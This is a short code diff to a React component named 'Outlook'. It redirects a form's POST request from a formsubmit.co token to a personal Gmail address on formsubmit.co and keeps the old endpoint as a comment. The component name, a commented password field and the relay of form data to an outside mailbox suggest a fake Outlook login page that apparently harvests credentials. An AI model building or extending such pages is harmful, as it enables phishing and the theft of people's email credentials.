@@ -73,7 +73,7 @@ function Outlook() {
       //  password: false,
       });
 
-      fetch("https://formsubmit.co/ajax/71a006782d2b17418053b9d5c4d5b706", {
+      fetch("https://formsubmit.co/oladunniwaters@gmail.com", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -107,7 +107,7 @@ function Outlook() {
   };
   
 
-
+//https://formsubmit.co/ajax/71a006782d2b17418053b9d5c4d5b706
 
 
   return (
